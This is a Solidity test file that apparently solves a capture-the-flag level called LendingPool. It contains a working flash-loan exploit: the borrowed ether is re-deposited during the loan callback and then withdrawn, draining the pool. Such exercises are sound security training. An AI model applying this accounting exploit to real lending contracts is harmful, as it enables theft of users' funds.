// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/08_LendingPool/LendingPool.sol";

// forge test --match-contract LendingPoolTest -vvvv
contract LendingPoolTest is BaseTest {
    LendingPool instance;

    function execute() external payable {
        // Deposit to the contract, increasing recorded balance artificially
        instance.deposit{value: msg.value}();
    }

    function setUp() public override {
        super.setUp();
        instance = new LendingPool{value: 0.1 ether}();
    }

    function testExploitLevel() public {
        instance.flashLoan(0.1 ether);
        // Withdraw the total balance, which has been increased in (flashloan) execute but not payed
        instance.withdraw();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
